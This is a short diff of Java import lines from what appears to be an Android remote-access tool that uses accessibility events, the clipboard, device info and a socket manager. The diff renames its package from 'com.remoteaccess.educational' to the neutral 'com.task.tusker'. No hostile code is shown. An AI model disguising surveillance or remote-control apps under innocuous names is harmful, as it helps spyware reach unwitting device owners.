@@ -7,8 +7,8 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-import com.remoteaccess.educational.network.SocketManager;
-import com.remoteaccess.educational.utils.DeviceInfo;
+import com.task.tusker.network.SocketManager;
+import com.task.tusker.utils.DeviceInfo;
 import org.json.JSONObject;
 import java.util.List;
 
